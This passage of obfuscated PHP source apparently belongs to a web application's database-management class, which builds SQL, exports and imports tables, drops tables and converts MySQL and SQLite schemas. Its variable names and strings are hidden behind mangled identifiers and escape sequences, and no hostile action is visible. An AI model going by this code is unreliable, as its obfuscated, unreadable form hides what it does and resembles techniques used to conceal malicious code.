($§´ş±ñø) { return $§´ş±ñø; } } $Ù¢ë¹ Ø = $this->parseSql($this->selectSql, $Ê¨¿Àçï); $Ù¢ë¹ Ø .= $this->parseLock(isset($Ê¨¿Àçï[$àíñæ…š[849]]) ? $Ê¨¿Àçï[$àíñæ…š[849]] : !1); if (isset($¶ ¤û²¼)) { think_cache($¶ ¤û²¼, $Ù¢ë¹ Ø); } return $Ù¢ë¹ Ø; } public function parseSql($­•šÜğÌ, $İŸ˜áõ• = array()) { $ÄŸôìê€ =& $_SERVER[Ü©»’·]; $­•šÜğÌ = str_replace(array($ÄŸôìê€[1049], $ÄŸôìê€[1050], $ÄŸôìê€[1051], $ÄŸôìê€[1052], $ÄŸôìê€[1053], $ÄŸôìê€[1054], $ÄŸôìê€[1055], $ÄŸôìê€[1056], $ÄŸôìê€[1057], $ÄŸôìê€[1058], $ÄŸôìê€[1059]), array($this->parseTable("{$İŸ˜áõ•[$ÄŸôìê€[279]]}"), $this->parseDistinct(isset($İŸ˜áõ•[$ÄŸôìê€[1060]]) ? $İŸ˜áõ•[$ÄŸôìê€[1060]] : !1), $this->parseField(!empty($İŸ˜áõ•[$ÄŸôìê€[273]]) ? $İŸ˜áõ•[$ÄŸôìê€[273]] : $ÄŸôìê€[188]), $this->parseJoin(!empty($İŸ˜áõ•[$ÄŸôìê€[282]]) ? $İŸ˜áõ•[$ÄŸôìê€[282]] : $ÄŸôìê€[12]), $this->parseWhere(!empty($İŸ˜áõ•[$ÄŸôìê€[275]]) ? $İŸ˜áõ•[$ÄŸôìê€[275]] : $ÄŸôìê€[12]), $this->parseGroup(!empty($İŸ˜áõ•[$ÄŸôìê€[524]]) ? $İŸ˜áõ•[$ÄŸôìê€[524]] : $ÄŸôìê€[12]), $this->parseHaving(!empty($İŸ˜áõ•[$ÄŸôìê€[1061]]) ? $İŸ˜áõ•[$ÄŸôìê€[1061]] : $ÄŸôìê€[12]), $this->parseOrder(!empty($İŸ˜áõ•[$ÄŸôìê€[374]]) ? $İŸ˜áõ•[$ÄŸôìê€[374]] : $ÄŸôìê€[12]), $this->parseLimit(!empty($İŸ˜áõ•[$ÄŸôìê€[292]]) ? $İŸ˜áõ•[$ÄŸôìê€[292]] : $ÄŸôìê€[12]), $this->parseUnion(!empty($İŸ˜áõ•[$ÄŸôìê€[347]]) ? $İŸ˜áõ•[$ÄŸôìê€[347]] : $ÄŸôìê€[12]), $this->parseComment(!empty($İŸ˜áõ•[$ÄŸôìê€[354]]) ? $İŸ˜áõ•[$ÄŸôìê€[354]] : $ÄŸôìê€[12])), $­•šÜğÌ); return $­•šÜğÌ; } public function getLastSql($ûÂÁ×¢ñ = '') { return $ûÂÁ×¢ñ ? $this->modelSql[$ûÂÁ×¢ñ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($òåôÍ‹¶) { return addslashes($òåôÍ‹¶); } public function setModel($€ë²µÆÙ) { $this->model = $€ë²µÆÙ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ï›¶Š´± = array()) { $”É æ¼ =& $_SERVER[Ü©»’·]; if (empty($ï›¶Š´±)) { $ï›¶Š´± = $GLOBALS[$”É æ¼[6]][$”É æ¼[21]]; } $this->database = $ï›¶Š´±; } public function model($Œ‚ïÖ’¾ = '') { return new ModelBase($Œ‚ïÖ’¾, $_SERVER[Ü©»’·][12], $this->database); } public function db($¬Ë±ï¿Û = false) { $¥µÁ =& $_SERVER[Ü©»’·]; $öÀ…î€ = array_change_key_case($this->database); if ($this->dbType() == $¥µÁ[13] || !$¬Ë±ï¿Û) { return $this->model()->db(); } $¿¦¹¯á = $öÀ…î€[$¥µÁ[975]]; $öÀ…î€[$¥µÁ[975]] = $¥µÁ[12]; if ($öÀ…î€[$¥µÁ[970]] == $¥µÁ[967]) { $Ø¿Ç‡ßÎ = $öÀ…î€[$¥µÁ[976]]; $öÀ…î€[$¥µÁ[976]] = substr($Ø¿Ç‡ßÎ, 0, strrpos($Ø¿Ç‡ßÎ, $¥µÁ[1062])); } $this->database = $öÀ…î€; $åŞ…¡ó = $this->model()->db(); try { $ó€‰äˆ“ = $åŞ…¡ó->execute("\163\x68\x6f\x77\x20\144\141\x74\141\142\x61\x73\145\163\x20\154\x69\153\145\x20\47{$¿¦¹¯á}\x27"); } catch (Exception $¼áç’®×) { } if (!$ó€‰äˆ“) { $åŞ…¡ó->execute("\x63\x72\x65\x61\x74\x65\40\x64\x61\x74\141\142\x61\163\x65\40\x60{$¿¦¹¯á}\140"); } $öÀ…î€[$¥µÁ[975]] = $¿¦¹¯á; if ($öÀ…î€[$¥µÁ[970]] == $¥µÁ[967]) { $öÀ…î€[$¥µÁ[976]] .= $¥µÁ[1062] . $¿¦¹¯á; } $this->database = $öÀ…î€; $åŞ…¡ó->execute("\165\x73\145\x20\140{$¿¦¹¯á}\x60"); return $åŞ…¡ó; } public function createTable($¾Ğ§İ¯, &$ÛëÖ˜Ôƒ) { $¼ã×ÖÆ =& $_SERVER[Ü©»’·]; if (!IO::exist($¾Ğ§İ¯)) { ActionCall($¼ã×ÖÆ[1063], !0, 0); show_json(LNG($¼ã×ÖÆ[1064]), !1); } $¦Ò’ü€§ = $this->model()->db(); $À¸™½ = sqlSplit(IO::getContent($¾Ğ§İ¯)); foreach ($À¸™½ as $ì‘Ã«) { $ÛÃµÚÜ™ = stripos($ì‘Ã«, $¼ã×ÖÆ[1065]) === 0; if ($ÛÃµÚÜ™) { $ÛëÖ˜Ôƒ->task[$¼ã×ÖÆ[792]] += 1; } $¦Ò’ü€§->execute($ì‘Ã«); if ($ÛÃµÚÜ™) { preg_match($¼ã×ÖÆ[1066], $ì‘Ã«, $­ğä¥ò×); $ÛëÖ˜Ôƒ->task[$¼ã×ÖÆ[1067]] = $­ğä¥ò×[1]; $ÛëÖ˜Ôƒ->update(1); } } } public function insertTable($’¨­á¨, &$©•Ã”å¯) { $È·æÏÓË =& $_SERVER[Ü©»’·]; $šÙçÍ‚î = $this->model()->db(); $‡ü¬° = $î¢ùÏµ ? array($î¢ùÏµ) : $šÙçÍ‚î->getTables(); foreach ($’¨­á¨ as $ªÄŞ¢Ëó) { $î¢ùÏµ = basename($ªÄŞ¢Ëó, $È·æÏÓË[794]); if (!in_array($î¢ùÏµ, $‡ü¬°)) { continue; } $©•Ã”å¯->task[$È·æÏÓË[1067]] = $î¢ùÏµ; if (get_filesize($ªÄŞ¢Ëó) == 0) { continue; } $¥‘¥Î³í = $this->sqlToDb($ªÄŞ¢Ëó, $©•Ã”å¯); if (!$¥‘¥Î³í) { ActionCall($È·æÏÓË[1063], !0, 0); show_json(LNG($È·æÏÓË[1068]) . "\133{$î¢ùÏµ}\x5d", !1); } } } public function sqlFromDb($ò„ï‘‡¥, $ÔÅ°­íè, &$ÍÔÔ×…×, $ÁƒÃôôÌ = '') { if ($ÍÔÔ×…×) { $ÍÔÔ×…×->task[$_SERVER[Ü©»’·][1067]] = $ò„ï‘‡¥; } $¡‚¦­Öõ = $this->model($ò„ï‘‡¥); $ô”«ˆÖÂ = 0; $½ßÓÓ‹â = 0; $êŒÜÌó = 10000; $ÜäÍïß‹ = fopen($ÔÅ°­íè, $_SERVER[Ü©»’·][1069]); $İ÷™§‹ò = $¡‚¦­Öõ->getPk(); $š£•§ôó = $¡‚¦­Öõ->getDbFields(); $¦ç‘–“š = $_SERVER[Ü©»’·][12]; if ($GLOBALS[$_SERVER[Ü©»’·][793]] && in_array($ò„ï‘‡¥, array($_SERVER[Ü©»’·][1070], $_SERVER[Ü©»’·][1071]))) { $¦ç‘–“š = $ò„ï‘‡¥; } do { $ßÒ¥¹õÆ = array($İ÷™§‹ò => array($_SERVER[Ü©»’·][1017], $½ßÓÓ‹â)); $ïÛĞ³Ò¥ = $¡‚¦­Öõ->where($ßÒ¥¹õÆ)->field($š£•§ôó)->order($İ÷™§‹ò . $_SERVER[Ü©»’·][1072])->limit($êŒÜÌó)->select(); $ïÛĞ³Ò¥ = !empty($ïÛĞ³Ò¥) ? $ïÛĞ³Ò¥ : array(); if (!($ù¢ËŞ‰ = count($ïÛĞ³Ò¥))) { break; } $Ä½ü¸İÆ = end($ïÛĞ³Ò¥); $½ßÓÓ‹â = $Ä½ü¸İÆ[$İ÷™§‹ò]; $é—”öÛ = array(); foreach ($ïÛĞ³Ò¥ as $„Æ²êĞ˜) { if ($¦ç‘–“š) { if ($ò„ï‘‡¥ == $_SERVER[Ü©»’·][1070]) { if ($„Æ²êĞ˜[$_SERVER[Ü©»’·][33]] == $_SERVER[Ü©»’·][1073]) { $ôšõ¸—… = json_decode($„Æ²êĞ˜[$_SERVER[Ü©»’·][383]], !0); if ($ôšõ¸—…[$_SERVER[Ü©»’·][32]] == $GLOBALS[$_SERVER[Ü©»’·][793]] && $ôšõ¸—…[$_SERVER[Ü©»’·][756]] != 1) { continue; } } } else { if ($„Æ²êĞ˜[$_SERVER[Ü©»’·][33]] == $_SERVER[Ü©»’·][1074] && $„Æ²êĞ˜[$_SERVER[Ü©»’·][94]] == $_SERVER[Ü©»’·][785]) { continue; } } } if ($ÁƒÃôôÌ) { $„Æ²êĞ˜[$_SERVER[Ü©»’·][84]] = "\173\x69\157\72{$ÁƒÃôôÌ}\x7d" . substr($„Æ²êĞ˜[$_SERVER[Ü©»’·][84]], strlen("\173\151\157\x3a{$„Æ²êĞ˜[$_SERVER[Ü©»’·][823]]}\175")); $„Æ²êĞ˜[$_SERVER[Ü©»’·][823]] = $ÁƒÃôôÌ; } $é—”öÛ[] = $_SERVER[Ü©»’·][1075] . $this->sqlEncode($„Æ²êĞ˜) . $_SERVER[Ü©»’·][1076]; } $…™îş½ = "\x49\x4e\x53\x45\x52\x54\x20\x49\116\x54\117\x20\x60{$ò„ï‘‡¥}\x60\x20\x28\x60" . implode($_SERVER[Ü©»’·][1077], $š£•§ôó) . $_SERVER[Ü©»’·][1078]; fwrite($ÜäÍïß‹, $…™îş½ . implode($_SERVER[Ü©»’·][1079], $é—”öÛ) . $_SERVER[Ü©»’·][71] . PHP_EOL); $ô”«ˆÖÂ += $ù¢ËŞ‰; if ($ÍÔÔ×…×) { $ÍÔÔ×…×->update($ù¢ËŞ‰); } } while ($êŒÜÌó == $ù¢ËŞ‰); fclose($ÜäÍïß‹); return $ô”«ˆÖÂ; } public function sqlToDb($¦Ïğü‡‡, &$›Ï×•ë’) { $“ğ€•½ =& $_SERVER[Ü©»’·]; $ö÷ğÛË– = $this->model()->db(); $óÄŒ£® = @fopen($¦Ïğü‡‡, $“ğ€•½[1080]); if (!$óÄŒ£®) { return !1; } $ùÃ’¸Öù = 0; $¶³ÚúÌ™ = $“ğ€•½[12]; $ÌÊÌË­í = array(); $í¯í¡±” = $this->dbType(); $öÅØäñš = $í¯í¡±” == $“ğ€•½[13] ? 500 : 2000; $ˆ…ÁØå· = basename($¦Ïğü‡‡, $“ğ€•½[794]); $ûÀıû±Ë = 0; $…´ÏóÔŞ = 4194304 - 104858; $ŸÑéËÓ’ = 1000000 - 104858; while (!feof($óÄŒ£®)) { $‹ÚÚ°Ùğ = trim(fgets($óÄŒ£®)); if (!$‹ÚÚ°Ùğ) { continue; } $ºóíß³Ê = $this->sqlDecode($‹ÚÚ°Ùğ, $í¯í¡±”, $ˆ…ÁØå·); if (stripos($ºóíß³Ê, $“ğ€•½[364]) === 0) { if (!$¶³ÚúÌ™) { $¶³ÚúÌ™ = $ºóíß³Ê . $“ğ€•½[53]; } continue; } if ($›Ï×•ë’) { $›Ï×•ë’->task[$“ğ€•½[792]] += 1; } $ùÃ’¸Öù++; $ÌÊÌË­í[] = rtrim(rtrim(trim($ºóíß³Ê), $“ğ€•½[50]), $“ğ€•½[71]); $å×Úàö¦ = null; $à©’Ãñ® = strlen($ºóíß³Ê); $ûÀıû±Ë += $à©’Ãñ®; if ($ûÀıû±Ë >= ($öÅØäñš == 500 ? $ŸÑéËÓ’ : $…´ÏóÔŞ)) { $å×Úàö¦ = array_pop($ÌÊÌË­í); if ($ùÃ’¸Öù > 1) { $ùÃ’¸Öù--; } } if ($ùÃ’¸Öù >= $öÅØäñš || $å×Úàö¦) { $ºóíß³Ê = $¶³ÚúÌ™ . implode($“ğ€•½[50], $ÌÊÌË­í); if (!$ö÷ğÛË–->execute($ºóíß³Ê)) { return !1; } if ($›Ï×•ë’) { $›Ï×•ë’->update($ùÃ’¸Öù); } $ÌÊÌË­í = array(); $ùÃ’¸Öù = 0; $ûÀıû±Ë = 0; if ($å×Úàö¦) { $ÌÊÌË­í = array($å×Úàö¦); $ùÃ’¸Öù = 1; $ûÀıû±Ë = $à©’Ãñ®; } } } fclose($óÄŒ£®); if (!empty($ÌÊÌË­í)) { $ºóíß³Ê = $¶³ÚúÌ™ . implode($“ğ€•½[50], $ÌÊÌË­í); if (!$ö÷ğÛË–->execute($ºóíß³Ê)) { return !1; } if ($›Ï×•ë’) { $›Ï×•ë’->update($ùÃ’¸Öù); } } return !0; } public function dropTable($¥€ÎãŠê = null) { $¦ğÃÚŒÍ = $this->model()->db(); $Õ¼é²œ– = $¥€ÎãŠê ? array($¥€ÎãŠê) : $¦ğÃÚŒÍ->getTables(); if (!$Õ¼é²œ–) { return; } foreach ($Õ¼é²œ– as $¥€ÎãŠê) { if ($¥€ÎãŠê) { $¥€ÎãŠê = strtolower($¥€ÎãŠê); } else { continue; } $¦ğÃÚŒÍ->execute("\144\162\x6f\160\x20\x74\141\x62\154\x65\40\x69\146\x20\145\170\151\x73\164\x73\40\x60{$¥€ÎãŠê}\x60"); } } private function sqlEncode($õÌ´î€Ë) { $ÅˆÆ–ä¥ =& $_SERVER[Ü©»’·]; $¡¦†ÉÖ = array(); foreach ($õÌ´î€Ë as $ø»»‡±ä) { if (is_array($ø»»‡±ä)) { $ø»»‡±ä = json_encode_force($ø»»‡±ä); } $ø»»‡±ä = addslashes($ø»»‡±ä); $ø»»‡±ä = str_replace(array($ÅˆÆ–ä¥[1081], $ÅˆÆ–ä¥[231]), array($ÅˆÆ–ä¥[1082], $ÅˆÆ–ä¥[1083]), $ø»»‡±ä); $¡¦†ÉÖ[] = str_replace($ÅˆÆ–ä¥[58], $ÅˆÆ–ä¥[1084], $ø»»‡±ä); } return $ÅˆÆ–ä¥[58] . implode($ÅˆÆ–ä¥[1085], $¡¦†ÉÖ) . $ÅˆÆ–ä¥[58]; } private function sqlDecode($ëı¾Æ¶Ô, $µßÅÉöÍ, $ç¦•ê»‡ = '') { $£»¾¥ÈŠ =& $_SERVER[Ü©»’·]; $ëı¾Æ¶Ô = str_replace(array($£»¾¥ÈŠ[1082], $£»¾¥ÈŠ[1083]), array($£»¾¥ÈŠ[1081], $£»¾¥ÈŠ[231]), $ëı¾Æ¶Ô); if ($µßÅÉöÍ == $£»¾¥ÈŠ[13]) { return $ç¦•ê»‡ != $£»¾¥ÈŠ[1086] ? stripslashes($ëı¾Æ¶Ô) : $ëı¾Æ¶Ô; } if ($ç¦•ê»‡ == $£»¾¥ÈŠ[1086]) { $ëı¾Æ¶Ô = str_replace($£»¾¥ÈŠ[1087], $£»¾¥ÈŠ[118], stripslashes($ëı¾Æ¶Ô)); } return $ëı¾Æ¶Ô; } public function getSqlFile($ÊáĞá£© = '') { $‹³ŠÚ” =& $_SERVER[Ü©»’·]; $ùâÜ¯¶ = $this->dbType(!0); $Œïç€şó = CONTROLLER_DIR . "\151\156\x73\x74\141\154\x6c\x2f\x64\x61\x74\x61\57{$ùâÜ¯¶}\56\163\x71\x6c"; $æÒÚ¨â® = file_get_contents($Œïç€şó); $¦¨à®«¾ = $‹³ŠÚ”[1088] . ($ùâÜ¯¶ == $‹³ŠÚ”[810] ? $‹³ŠÚ”[1089] : $‹³ŠÚ”[1090]) . $‹³ŠÚ”[1091]; preg_match_all($¦¨à®«¾, $æÒÚ¨â®, $÷§í‘ÏŞ); $•«½‘—œ = $÷§í‘ÏŞ[1]; $íÕÉóÎö = $this->model()->db(); $´ÔîµóØ = $íÕÉóÎö->getTables(); $®û³Œö = TEMP_FILES . $‹³ŠÚ”[1092] . date($‹³ŠÚ”[757]) . $‹³ŠÚ”[8]; del_dir($®û³Œö); mk_dir($®û³Œö); $Ô«ªÎ±É = $®û³Œö . $‹³ŠÚ”[1093]; $÷„´Óáì = $®û³Œö . $‹³ŠÚ”[1094]; $ô¤ÜÇÀŠ = $ùâÜ¯¶ == $‹³ŠÚ”[13] ? $‹³ŠÚ”[810] : $‹³ŠÚ”[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\x6c\154\57\144\x61\164\141\57{$ô¤ÜÇÀŠ}\56\x73\161\154", $®û³Œö); @touch($®û³Œö . $ùâÜ¯¶ . $‹³ŠÚ”[794]); $Ğ“Ö = fopen($Ô«ªÎ±É, $‹³ŠÚ”[1069]); $ØØü£· = fopen($÷„´Óáì, $‹³ŠÚ”[1069]); if ($ùâÜ¯¶ == $‹³ŠÚ”[13]) { $´ÔîµóØ = array_diff($´ÔîµóØ, array($‹³ŠÚ”[790], $‹³ŠÚ”[791])); $ğç¯ÜšÊ = array($‹³ŠÚ”[1095], $‹³ŠÚ”[1096], $‹³ŠÚ”[1097]); fwrite($ØØü£·, implode(PHP_EOL, $ğç¯ÜšÊ) . PHP_EOL . PHP_EOL); foreach ($´ÔîµóØ as $ß‹Üš¡š) { $ùşø¥¹ï = $this->sqlFromSqlite($ß‹Üš¡š); if (!$ùşø¥¹ï[$‹³ŠÚ”[13]]) { continue; } fwrite($ØØü£·, $ùşø¥¹ï[$‹³ŠÚ”[13]] . PHP_EOL . PHP_EOL); if (!in_array($ß‹Üš¡š, $•«½‘—œ)) { fwrite($Ğ“Ö, $ùşø¥¹ï[$‹³ŠÚ”[810]] . PHP_EOL . PHP_EOL); } } } else { foreach ($´ÔîµóØ as $ß‹Üš¡š) { $ùşø¥¹ï = $this->sqlFromMysql($ß‹Üš¡š); if (!$ùşø¥¹ï[$‹³ŠÚ”[810]]) { continue; } fwrite($Ğ“Ö, $ùşø¥¹ï[$‹³ŠÚ”[810]] . PHP_EOL . PHP_EOL); if (!in_array($ß‹Üš¡š, $•«½‘—œ)) { fwrite($ØØü£·, $ùşø¥¹ï[$‹³ŠÚ”[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ğ“Ö); fclose($ØØü£·); $æÒÚ¨â® = array($‹³ŠÚ”[810] => $Ô«ªÎ±É, $‹³ŠÚ”[13] => $÷„´Óáì); return $ÊáĞá£© ? $æÒÚ¨â®[$ÊáĞá£©] : $æÒÚ¨â®; } public function dbType($”ƒ’¦€– = false) { $±÷Ú‰³Ü =& $_SERVER[Ü©»’·]; $Æ“¬Íˆì = $”ƒ’¦€– ? $GLOBALS[$±÷Ú‰³Ü[6]][$±÷Ú‰³Ü[21]] : $this->database; $Æ“¬Íˆì = array_change_key_case($Æ“¬Íˆì); $§²¡¦·˜ = $Æ“¬Íˆì[$±÷Ú‰³Ü[970]]; if ($§²¡¦·˜ == $±÷Ú‰³Ü[967]) { $˜¬óÂşê = explode($±÷Ú‰³Ü[4], $Æ“¬Íˆì[$±÷Ú‰³Ü[976]]); $§²¡¦·˜ = $˜¬óÂşê[0]; } $»ÎÈ½¦ = array($±÷Ú‰³Ü[1098] => $±÷Ú‰³Ü[13], $±÷Ú‰³Ü[915] => $±÷Ú‰³Ü[810]); if (isset($»ÎÈ½¦[$§²¡¦·˜])) { $§²¡¦·˜ = $»ÎÈ½¦[$§²¡¦·˜]; } return $§²¡¦·˜; } public function sqlFromMysql($×«î‹, $Şˆ„§ÃÙ = '') { $çô‚ì¼š =& $_SERVER[Ü©»’·]; $ëö²üÁ‚ = $this->model()->db(); $™²çĞ¹¬ = $ëö²üÁ‚->query($çô‚ì¼š[1099] . $×«î‹ . $çô‚ì¼š[394]); if (!$™²çĞ¹¬ || !$™²çĞ¹¬[0]) { return !1; } $ü›´µ = _get($™²çĞ¹¬[0], $çô‚ì¼š[1100], $çô‚ì¼š[12]); if (!$ü›´µ) { return !1; } $¨ß³¥Åó = "\x44\122\x4f\120\x20\124\x41\102\x4c\x45\40\x49\106\40\x45\x58\x49\123\x54\x53\x20\x60{$×«î‹}\x60\x3b" . PHP_EOL . $ü›´µ . $çô‚ì¼š[71]; if ($Şˆ„§ÃÙ && $Şˆ„§ÃÙ == $çô‚ì¼š[810]) { return $¨ß³¥Åó; } $’şŞ¾Ç¿ = array_change_key_case($GLOBALS[$çô‚ì¼š[6]][$çô‚ì¼š[21]]); $Õ·×Á²– = $’şŞ¾Ç¿[$çô‚ì¼š[975]]; $•ä™ñç† = $çô‚ì¼š[1101] . $Õ·×Á²– . $çô‚ì¼š[1102] . $×«î‹ . $çô‚ì¼š[58]; $¯ùÉ”§¥ = $çô‚ì¼š[1103] . $×«î‹ . $çô‚ì¼š[903]; $ÅêĞ„õà = $ëö²üÁ‚->query($•ä™ñç†); if (empty($ÅêĞ„õà)) { $¡¯ÏË•Ò = array($çô‚ì¼š[810] => $çô‚ì¼š[12], $çô‚ì¼š[13] => $çô‚ì¼š[12]); return $Şˆ„§ÃÙ ? $¡¯ÏË•Ò[$Şˆ„§ÃÙ] : $¡¯ÏË•Ò; } $¿ÚÒ¡š» = $ëö²üÁ‚->query($¯ùÉ”§¥); $´ê¹ÚÖŒ = $çô‚ì¼š[12]; $§Äß—Áí = array(); foreach ($¿ÚÒ¡š» as $ñ©…ğ¤€) { if (!$´ê¹ÚÖŒ && $ñ©…ğ¤€[$çô‚ì¼š[1104]] == $çô‚ì¼š[1105]) { $´ê¹ÚÖŒ = $ñ©…ğ¤€[$çô‚ì¼š[1106]]; } if (isset($§Äß—Áí[$ñ©…ğ¤€[$çô‚ì¼š[1104]]])) { $§Äß—Áí[$ñ©…ğ¤€[$çô‚ì¼š[1104]]][$çô‚ì¼š[1107]][] = $ñ©…ğ¤€[$çô‚ì¼š[1106]]; continue; } $§Äß—Áí[$ñ©…ğ¤€[$çô‚ì¼š[1104]]] = array($çô‚ì¼š[1108] => $ñ©…ğ¤€[$çô‚ì¼š[1104]], $çô‚ì¼š[1107] => array($ñ©…ğ¤€[$çô‚ì¼š[1106]]), $çô‚ì¼š[1109] => $ñ©…ğ¤€[$çô‚ì¼š[1110]] == $çô‚ì¼š[88] ? 0 : 1); } $‘»İß“ = array(); foreach ($§Äß—Áí as $ñ©…ğ¤€) { $ñè÷…ğº = $ñ©…ğ¤€[$çô‚ì¼š[1108]] == $çô‚ì¼š[1105]; $‰àØò‰ô = array($çô‚ì¼š[1111], $ñ©…ğ¤€[$çô‚ì¼š[1109]] == $çô‚ì¼š[88] && !$ñè÷…ğº ? $çô‚ì¼š[1112] : $çô‚ì¼š[12], $çô‚ì¼š[1113], $çô‚ì¼š[1114] . $×«î‹ . $çô‚ì¼š[11] . ($ñè÷…ğº ? $çô‚ì¼š[1115] : $ñ©…ğ¤€[$çô‚ì¼š[1108]]) . $çô‚ì¼š[118], $çô‚ì¼š[1116], $çô‚ì¼š[118] . $×«î‹ . $çô‚ì¼š[118], $çô‚ì¼š[1117] . implode($çô‚ì¼š[1118], $ñ©…ğ¤€[$çô‚ì¼š[1107]]) . $çô‚ì¼š[1119]); $‘»İß“[] = implode($çô‚ì¼š[53], $‰àØò‰ô) . $çô‚ì¼š[71]; } $íºÄÕ’ç = array(); $¢ŒÕÜö = array($çô‚ì¼š[1120] => $çô‚ì¼š[1121], $çô‚ì¼š[1121] => $çô‚ì¼š[1121], $çô‚ì¼š[288] => $çô‚ì¼š[315], $çô‚ì¼š[287] => $çô‚ì¼š[315]); foreach ($ÅêĞ„õà as $ñ©…ğ¤€) { $‰àØò‰ô = array($çô‚ì¼š[118] . $ñ©…ğ¤€[$çô‚ì¼š[1122]] . $çô‚ì¼š[118], isset($¢ŒÕÜö[$ñ©…ğ¤€[$çô‚ì¼š[1123]]]) ? $¢ŒÕÜö[$ñ©…ğ¤€[$çô‚ì¼š[1123]]] : $ñ©…ğ¤€[$çô‚ì¼š[1124]], $ñ©…ğ¤€[$çô‚ì¼š[1125]] == $çô‚ì¼š[901] ? $çô‚ì¼š[1126] : $çô‚ì¼š[1127], $ñ©…ğ¤€[$çô‚ì¼š[1122]] == $´ê¹ÚÖŒ ? $çô‚ì¼š[1128] : $çô‚ì¼š[12], $ñ©…ğ¤€[$çô‚ì¼š[952]] ? strtoupper(str_replace($çô‚ì¼š[11], $çô‚ì¼š[12], $ñ©…ğ¤€[$çô‚ì¼š[952]])) : $çô‚ì¼š[12]); $íºÄÕ’ç[] = trim(implode($çô‚ì¼š[53], $‰àØò‰ô)); } $š×—¦ª = array($çô‚ì¼š[1129] . $×«î‹ . $çô‚ì¼š[1130], $çô‚ì¼š[1131] . $×«î‹ . $çô‚ì¼š[1132], implode($çô‚ì¼š[50] . PHP_EOL, $íºÄÕ’ç), $çô‚ì¼š[949]); $‘…¦İ­ï = implode(PHP_EOL, array_merge($š×—¦ª, $‘»İß“)); if ($Şˆ„§ÃÙ && $Şˆ„§ÃÙ == $çô‚ì¼š[13]) { return $‘…¦İ­ï; } $¡¯ÏË•Ò = array($çô‚ì¼š[810] => $¨ß³¥Åó, $çô‚ì¼š[13] => $‘…¦İ­ï); return $Şˆ„§ÃÙ ? $¡¯ÏË•Ò[$Şˆ„§ÃÙ] : $¡¯ÏË•Ò; } public function sqlFromSqlite($Ì»óµ°, $î¶¾°Õ¸ = '') { $áã²µ×Š =& $_SERVER[Ü©»’·]; $ÇÏŞøÛÍ = $this->model()->db(); $“ı£äöù = "\x50\122\101\107\115\x41\x20\124\101\102\x4c\105\x5f\111\x4e\106\x4f\x20\x28\47{$Ì»óµ°}\x27\x29"; $ÁÅÀ¼Ö = "\123\x45\114\x45\x43\x54\x20\52\x20\106\122\117\x4d\x20\x73\161\x6c\x69\x74\145\x5f\155\x61\163\x74\x65\x72\40\127\x48\105\x52\x45\40\164\x62\154\x5f\x6e\x61\155\x65\x20\x3d\x20\x27{$Ì»óµ°}\47"; $ÇÆÑ©úÔ = $ÇÏŞøÛÍ->query($“ı£äöù); if (empty($ÇÆÑ©úÔ)) { $¥¢ÌãÈõ = array($áã²µ×Š[810] => $áã²µ×Š[12], $áã²µ×Š[13] => $áã²µ×Š[12]); return $î¶¾°Õ¸ ? $¥¢ÌãÈõ[$î¶¾°Õ¸] : $¥¢ÌãÈõ; } $ú»Ö›…‡ = $ÇÏŞøÛÍ->query($ÁÅÀ¼Ö); $À¡Ç§Çì = $ğãáìËä = array(); foreach ($ú»Ö›…‡ as $ÚÍ•ï³Â) { if ($ÚÍ•ï³Â[$áã²µ×Š[33]] == $áã²µ×Š[279]) { $À¡Ç§Çì[] = $ÚÍ•ï³Â[$áã²µ×Š[1133]]; } else { $ğãáìËä[$ÚÍ•ï³Â[$áã²µ×Š[32]]] = $ÚÍ•ï³Â[$áã²µ×Š[1133]]; } } $¹¦Í‰˜Ê = array_merge(array($áã²µ×Š[1129] . $Ì»óµ° . $áã²µ×Š[118]), $À¡Ç§Çì, array_values($ğãáìËä)); $¹¦Í‰˜Ê = implode($áã²µ×Š[71] . PHP_EOL, $¹¦Í‰˜Ê) . $áã²µ×Š[71]; if ($î¶¾°Õ¸ && $î¶¾°Õ¸ == $áã²µ×Š[13]) { return $¹¦Í‰˜Ê; } $õ’˜‡³ = array(); $”üæõ‘ş = array($áã²µ×Š[1121] => $áã²µ×Š[1134], $áã²µ×Š[315] => $áã²µ×Š[1135]); $‰‰İ“²Ø = $áã²µ×Š[12]; foreach ($ÇÆÑ©úÔ as $ÚÍ•ï³Â) { if ($ÚÍ•ï³Â[$áã²µ×Š[57]] == $áã²µ×Š[88]) { $‰‰İ“²Ø = $ÚÍ•ï³Â[$áã²µ×Š[32]]; } $±Ë¯›´¼ = array($áã²µ×Š[394] . $ÚÍ•ï³Â[$áã²µ×Š[32]] . $áã²µ×Š[394], isset($”üæõ‘ş[$ÚÍ•ï³Â[$áã²µ×Š[33]]]) ? $”üæõ‘ş[$ÚÍ•ï³Â[$áã²µ×Š[33]]] : $ÚÍ•ï³Â[$áã²µ×Š[33]], $ÚÍ•ï³Â[$áã²µ×Š[35]] == $áã²µ×Š[88] ? $áã²µ×Š[1126] : $áã²µ×Š[1136] . $ÚÍ•ï³Â[$áã²µ×Š[56]], $ÚÍ•ï³Â[$áã²µ×Š[57]] == $áã²µ×Š[88] ? $áã²µ×Š[1137] : $áã²µ×Š[12]); $õ’˜‡³[] = trim(implode($áã²µ×Š[53], $±Ë¯›´¼)); } foreach ($ğãáìËä as $Š°ğ¾ˆ => $ãÄÃë·¡) { $ñöé¥Úõ = str_replace($áã²µ×Š[1138] . $Ì»óµ° . $áã²µ×Š[11], $áã²µ×Š[12], $Š°ğ¾ˆ); $œÏº£•À = str_replace(array($áã²µ×Š[118], $áã²µ×Š[960]), $áã²µ×Š[394], substr($ãÄÃë·¡, stripos($ãÄÃë·¡, $áã²µ×Š[260]))); if ($ñöé¥Úõ == $áã²µ×Š[1115]) { $‡ÆŞ¡¬ó = $áã²µ×Š[1139] . $‰‰İ“²Ø . $áã²µ×Š[1140]; } else { $‡ÆŞ¡¬ó = (stripos($ñöé¥Úõ, $áã²µ×Š[11]) ? $áã²µ×Š[1141] : $áã²µ×Š[12]) . ($áã²µ×Š[1142] . $ñöé¥Úõ . $áã²µ×Š[1143] . $œÏº£•À); } $õ’˜‡³[] = $‡ÆŞ¡¬ó; } $×æ¦Ö÷™ = array($áã²µ×Š[1144] . $Ì»óµ° . $áã²µ×Š[1145], $áã²µ×Š[1146] . $Ì»óµ° . $áã²µ×Š[1147], implode($áã²µ×Š[50] . PHP_EOL, $õ’˜‡³), $áã²µ×Š[1148]); $ñ‘ˆæÍÖ = 